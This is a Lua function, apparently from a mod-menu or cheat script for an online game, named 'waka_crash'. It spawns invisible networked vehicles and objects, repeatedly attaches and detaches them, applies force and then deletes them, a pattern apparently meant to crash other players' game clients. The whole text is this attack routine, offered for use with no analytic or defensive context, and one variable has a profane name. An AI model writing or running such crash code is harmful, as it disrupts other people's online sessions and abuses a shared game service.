function waka_crash(pid)
    utilities.request_model(-877478386)
    utilities.request_model(2099682835)
    utilities.request_model(-877478386)
    local coords = player.get_player_coords(player.player_id())
    trailer = vehicle.create_vehicle(-877478386, coords, 0, true, false)
    fuckme = object.create_object(2099682835, coords, true, false)
    entity.set_entity_visible(trailer, false, 0)
    entity.set_entity_visible(fuckme, false, 0)
    entity.set_entity_velocity(trailer, coords, 3, 3)
    entity.set_entity_velocity(fuckme, coords, 4, 5)
    for i = 1, 3 do
        natives.ATTACH_ENTITY_TO_ENTITY(trailer, fuckme, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        coords.x = coords.x
        coords.y = coords.y + 20
        coords.z = coords.z
        local vehicle = vehicle.create_vehicle(-877478386, coords, 0, true, false)
        natives.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, -100, 0, true, false, true)
        system.yield(300)
        natives.DETACH_ENTITY(trailer)
        end
        entity_func.hard_remove_entity(trailer)
        entity_func.hard_remove_entity(fuckme)
        system.yield(1500)
end